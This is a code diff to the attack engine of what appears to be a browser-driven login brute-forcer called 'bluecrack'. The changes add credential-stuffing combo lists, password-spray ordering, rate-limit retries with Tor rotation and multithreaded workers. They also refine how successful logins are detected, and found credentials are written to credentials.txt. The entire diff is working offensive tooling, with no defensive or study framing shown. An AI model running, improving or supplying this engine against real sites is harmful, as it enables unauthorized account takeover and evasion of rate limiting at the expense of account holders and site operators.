@@ -10,7 +10,6 @@ import time
 from queue import Queue
 from typing import Any, Callable, Dict, List, Optional, Set, Tuple
 
-from selenium import webdriver
 from selenium.common.exceptions import (
     NoSuchElementException,
     TimeoutException,
@@ -58,7 +57,17 @@ class AttackEngine:
         self._attack_thread: Optional[threading.Thread] = None
 
         # Metrics
-        self.metrics: Dict[str, int] = {}
+        self.metrics: Dict[str, int] = {
+            "attempted": 0,
+            "successes": 0,
+            "failures": 0,
+            "errors": 0,
+            "rate_limit_hits": 0,
+            "skipped_empty": 0,
+            "skipped_solved_user": 0,
+            "requeued": 0,
+            "rate_retry_exhausted": 0,
+        }
         self._metrics_lock = threading.Lock()
         self._last_metrics_emit: float = 0.0
 
@@ -108,26 +117,27 @@ class AttackEngine:
 
     def _build_metrics_snapshot(self) -> Dict[str, Any]:
         """Build the full metrics snapshot including speed, eta, and hits."""
-        m = dict(self.metrics)
+        with self._metrics_lock:
+            m = dict(self.metrics)
         elapsed = time.time() - self._start_time if self._start_time else 0
         m["elapsed"] = elapsed
 
         # Calculate speed (attempts per second)
         speed = 0.0
         if elapsed > 0:
-            speed = self.metrics.get("attempted", 0) / elapsed
+            speed = m.get("attempted", 0) / elapsed
         m["speed"] = speed
 
         # Calculate ETA (seconds remaining)
-        eta = 0
+        eta = 0.0
         total = getattr(self, "total", 0)
         if speed > 0 and total:
-            left = total - self.metrics.get("attempted", 0)
+            left = max(0, total - m.get("attempted", 0))
             eta = left / speed
         m["eta"] = eta
 
         # Map successes to hits for frontend compatibility
-        m["hits"] = self.metrics.get("successes", 0)
+        m["hits"] = m.get("successes", 0)
         return m
 
     def _emit_metrics(self, force: bool = False) -> None:
@@ -173,26 +183,33 @@ class AttackEngine:
         self._stop_flag.clear()
         self._global_stop.clear()
         self._found_event.clear()
-        self._found_users.clear()
-        self._found_creds.clear()
-        self._logs.clear()
+        with self._found_lock:
+            self._found_users.clear()
+            self._found_creds.clear()
+        with self._logs_lock:
+            self._logs.clear()
         self._running = True
         self._start_time = time.time()
-        self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))
+        self._target_url = ctx.get("target_url", "")
+        if "combos" in ctx and ctx["combos"]:
+            self.total = len(ctx["combos"])
+        else:
+            self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))
         self._session_mgr = SessionManager() if ctx.get("enable_session", True) else None
         self._ctx = ctx
 
-        self.metrics = {
-            "attempted": 0,
-            "successes": 0,
-            "failures": 0,
-            "errors": 0,
-            "rate_limit_hits": 0,
-            "skipped_empty": 0,
-            "skipped_solved_user": 0,
-            "requeued": 0,
-            "rate_retry_exhausted": 0,
-        }
+        with self._metrics_lock:
+            self.metrics = {
+                "attempted": 0,
+                "successes": 0,
+                "failures": 0,
+                "errors": 0,
+                "rate_limit_hits": 0,
+                "skipped_empty": 0,
+                "skipped_solved_user": 0,
+                "requeued": 0,
+                "rate_retry_exhausted": 0,
+            }
 
         self._attack_thread = threading.Thread(
             target=self._run_attack, args=(ctx,), daemon=True
@@ -204,10 +221,17 @@ class AttackEngine:
         try:
             users: List[str] = ctx["users"]
             passwords: List[str] = ctx["passwords"]
-            total: int = len(users) * len(passwords)
+            if "combos" in ctx and ctx["combos"]:
+                total = len(ctx["combos"])
+            else:
+                total = len(users) * len(passwords)
+            self.total = total
             done: List[int] = [0]
+            done_lock = threading.Lock()
             multiple_users: bool = len(users) > 1
-            success_msg: str = ctx.get("success_msg", "").lower().strip()
+            success_msg: str = (ctx.get("success_msg") or "").lower().strip()
+            error_msg: str = (ctx.get("error_msg") or "").lower().strip()
+            limit_text: str = (ctx.get("limit_text") or "").lower().strip()
             max_attempts: int = ctx.get("max_attempts", 0)
             continue_after: bool = ctx.get("continue_after_success", False)
 
@@ -220,7 +244,10 @@ class AttackEngine:
             spray_mode = ctx.get("spray_mode", False)
 
             def populate() -> None:
-                if spray_mode:
+                if "combos" in ctx and ctx["combos"]:
+                    for u, p in ctx["combos"]:
+                        q.put((u, p))
+                elif spray_mode:
                     for p in passwords:
                         for u in users:
                             q.put((u, p))
@@ -233,7 +260,8 @@ class AttackEngine:
 
             # Setup driver for selector detection
             self._log("[*] Opening browser for selector setup...")
-            setup_driver = create_driver_safe(webdriver.ChromeOptions())
+            setup_options = build_chrome_options(ctx)
+            setup_driver = create_driver_safe(setup_options)
             if setup_driver is None:
                 self._log("[-] Failed to create setup browser.")
                 if self._finished_callback:
@@ -258,17 +286,21 @@ class AttackEngine:
                     self._log("    Click username field → press S")
                     self._log("    Click password field → press T")
                     if HAS_KEYBOARD:
+                        setup_timeout = time.time() + 60.0
                         while not (
                             ctx.get("username_selector")
                             and ctx.get("password_selector")
                         ):
-                            if self._stop_flag.is_set():
+                            if self._stop_flag.is_set() or self._global_stop.is_set():
                                 setup_driver.quit()
                                 if self._finished_callback:
                                     self._finished_callback(
                                         False, "Stopped by user."
                                     )
                                 return
+                            if time.time() > setup_timeout:
+                                self._log("[-] Setup timeout (60s) reached without field selection.")
+                                break
                             if keyboard.is_pressed("s"):
                                 elem = setup_driver.execute_script(
                                     "return window._lastClicked"
@@ -319,7 +351,38 @@ class AttackEngine:
             except Exception:
                 pass
 
-            self._log(f"[*] Launching {ctx['threads']} worker thread(s)...")
+            if not (ctx.get("username_selector") and ctx.get("password_selector")):
+                if self._finished_callback:
+                    self._finished_callback(False, "Username and password selectors could not be determined.")
+                return
+
+            self._log(f"[*] Launching {ctx.get('threads', 1)} worker thread(s)...")
+
+            def _step_progress() -> None:
+                with done_lock:
+                    done[0] += 1
+                    cur = done[0]
+                self._emit_progress(cur, total)
+                q.task_done()
+                self._emit_metrics()
+                if (
+                    self._session_mgr
+                    and self._session_mgr.auto_save_interval > 0
+                    and cur % self._session_mgr.auto_save_interval == 0
+                ):
+                    remaining = []
+                    try:
+                        with q.mutex:
+                            remaining = list(q.queue)
+                    except Exception:
+                        pass
+                    with self._metrics_lock:
+                        m_copy = dict(self.metrics)
+                    with self._found_lock:
+                        fc_copy = list(self._found_creds)
+                    self._session_mgr.save_state(
+                        self._ctx, remaining, m_copy, fc_copy
+                    )
 
             def _run_worker() -> None:
                 options = build_chrome_options(ctx)
@@ -333,8 +396,7 @@ class AttackEngine:
                 tor_counter: int = 0
                 try:
                     while (
-                        not q.empty()
-                        and not self._stop_flag.is_set()
+                        not self._stop_flag.is_set()
                         and not self._global_stop.is_set()
                     ):
                         # Check max attempts
@@ -343,28 +405,31 @@ class AttackEngine:
                                 if self.metrics["attempted"] >= max_attempts:
                                     break
 
-                        if not continue_after:
-                            if not multiple_users and self._found_users:
-                                break
+                        if not continue_after and not multiple_users:
+                            with self._found_lock:
+                                if self._found_users:
+                                    break
 
                         try:
                             user, pwd = q.get(timeout=1)
                         except Exception:
-                            break
+                            if q.empty():
+                                break
+                            continue
 
                         if not pwd or not pwd.strip():
                             with self._metrics_lock:
                                 self.metrics["skipped_empty"] += 1
-                            q.task_done()
+                            _step_progress()
                             continue
 
-                        if not continue_after and user in self._found_users:
-                            with self._metrics_lock:
-                                self.metrics["skipped_solved_user"] += 1
-                            done[0] += 1
-                            self._emit_progress(done[0], total)
-                            q.task_done()
-                            continue
+                        if not continue_after:
+                            with self._found_lock:
+                                if user in self._found_users:
+                                    with self._metrics_lock:
+                                        self.metrics["skipped_solved_user"] += 1
+                                    _step_progress()
+                                    continue
 
                         tor_counter += 1
                         if (
@@ -390,7 +455,7 @@ class AttackEngine:
                                 EC.presence_of_element_located(
                                     (By.CSS_SELECTOR, ctx["username_selector"])
                                 )
-                             )
+                            )
                             p_el = wait.until(
                                 EC.presence_of_element_located(
                                     (By.CSS_SELECTOR, ctx["password_selector"])
@@ -422,10 +487,7 @@ class AttackEngine:
                                 pass
 
                             # Rate limit check
-                            if (
-                                ctx.get("limit_text")
-                                and ctx["limit_text"] in src
-                            ):
+                            if limit_text and limit_text in src:
                                 self._log("[!] Rate limit hit!")
                                 with self._metrics_lock:
                                     self.metrics["rate_limit_hits"] += 1
@@ -446,9 +508,7 @@ class AttackEngine:
                                     )
                                     with self._metrics_lock:
                                         self.metrics["rate_retry_exhausted"] += 1
-                                    done[0] += 1
-                                    self._emit_progress(done[0], total)
-                                    q.task_done()
+                                    _step_progress()
                                     continue
 
                                 if ctx.get("use_tor"):
@@ -465,16 +525,10 @@ class AttackEngine:
                                 continue
 
                             # Error text check
-                            if (
-                                ctx.get("error_msg")
-                                and ctx["error_msg"] in src
-                            ):
+                            if error_msg and error_msg in src:
                                 with self._metrics_lock:
                                     self.metrics["failures"] += 1
-                                done[0] += 1
-                                self._emit_progress(done[0], total)
-                                q.task_done()
-                                self._emit_metrics()
+                                _step_progress()
                                 continue
 
                             # Determine success
@@ -488,8 +542,9 @@ class AttackEngine:
                                 and "login" not in current_url.lower()
                             ):
                                 is_success = True
-                            elif ctx.get("error_msg"):
-                                is_success = True
+                            elif error_msg:
+                                if src and error_msg not in src:
+                                    is_success = True
 
                             if is_success:
                                 with self._found_lock:
@@ -501,7 +556,7 @@ class AttackEngine:
                                 with self._metrics_lock:
                                     self.metrics["successes"] += 1
 
-                                if "notifier" in ctx:
+                                if "notifier" in ctx and ctx["notifier"]:
                                     try:
                                         ctx["notifier"].notify(
                                             "credential_found",
@@ -533,55 +588,21 @@ class AttackEngine:
                                 except Exception:
                                     pass
 
-                                done[0] += 1
-                                self._emit_progress(done[0], total)
-                                q.task_done()
-                                self._emit_metrics()
+                                try:
+                                    wd.delete_all_cookies()
+                                except Exception:
+                                    pass
 
-                                # Auto-save session periodically
-                                if self._session_mgr and done[0] % self._session_mgr.auto_save_interval == 0:
-                                    remaining = []
-                                    try:
-                                        with q.mutex:
-                                            remaining = list(q.queue)
-                                    except Exception:
-                                        pass
-                                    self._session_mgr.save_state(
-                                        self._ctx, remaining, dict(self.metrics),
-                                        list(self._found_creds),
-                                    )
+                                _step_progress()
 
                                 if not continue_after and not multiple_users:
                                     with q.mutex:
                                         q.queue.clear()
                                     break
-
-                                # Clear browser state for clean session (reuse browser)
-                                try:
-                                    wd.delete_all_cookies()
-                                except Exception:
-                                    pass
                             else:
                                 with self._metrics_lock:
                                     self.metrics["failures"] += 1
-
-                            done[0] += 1
-                            self._emit_progress(done[0], total)
-                            q.task_done()
-                            self._emit_metrics()
-
-                            # Auto-save session periodically
-                            if self._session_mgr and done[0] % self._session_mgr.auto_save_interval == 0:
-                                remaining = []
-                                try:
-                                    with q.mutex:
-                                        remaining = list(q.queue)
-                                except Exception:
-                                    pass
-                                self._session_mgr.save_state(
-                                    self._ctx, remaining, dict(self.metrics),
-                                    list(self._found_creds),
-                                )
+                                _step_progress()
 
                         except (NoSuchElementException, TimeoutException):
                             self._log(
@@ -589,18 +610,12 @@ class AttackEngine:
                             )
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            done[0] += 1
-                            self._emit_progress(done[0], total)
-                            q.task_done()
-                            self._emit_metrics()
+                            _step_progress()
                         except Exception as ex:
                             self._log(f"[-] Worker attempt error: {ex}")
                             with self._metrics_lock:
                                 self.metrics["errors"] += 1
-                            done[0] += 1
-                            self._emit_progress(done[0], total)
-                            q.task_done()
-                            self._emit_metrics()
+                            _step_progress()
                 finally:
                     try:
                         wd.quit()
@@ -608,7 +623,8 @@ class AttackEngine:
                         pass
 
             workers: List[threading.Thread] = []
-            for _ in range(ctx.get("threads", 1)):
+            threads_count = ctx.get("threads", 1)
+            for _ in range(threads_count):
                 t = threading.Thread(target=_run_worker, daemon=True)
                 t.start()
                 workers.append(t)
@@ -621,17 +637,20 @@ class AttackEngine:
             # Auto-save JSON report
             save_json_report(
                 "bluecrack_report.json",
-                ctx["target_url"],
-                self.metrics,
-                self._found_creds,
+                ctx.get("target_url", ""),
+                self.get_metrics(),
+                self.get_found_creds(),
                 self._start_time,
                 end_time,
             )
 
             self._emit_metrics(force=True)
 
-            if self._found_users:
-                saved_msg = f"Valid credentials found for {len(self._found_users)} user(s)! Saved to credentials.txt"
+            with self._found_lock:
+                found_count = len(self._found_users)
+
+            if found_count > 0:
+                saved_msg = f"Valid credentials found for {found_count} user(s)! Saved to credentials.txt"
                 if self._finished_callback:
                     self._finished_callback(True, saved_msg)
             elif self._stop_flag.is_set() or self._global_stop.is_set():
@@ -642,7 +661,6 @@ class AttackEngine:
                     self._finished_callback(False, "No valid credentials found.")
 
         finally:
-            # Clear session on completion
             if hasattr(self, "_session_mgr") and self._session_mgr:
                 self._session_mgr.clear_session()
             self._running = False
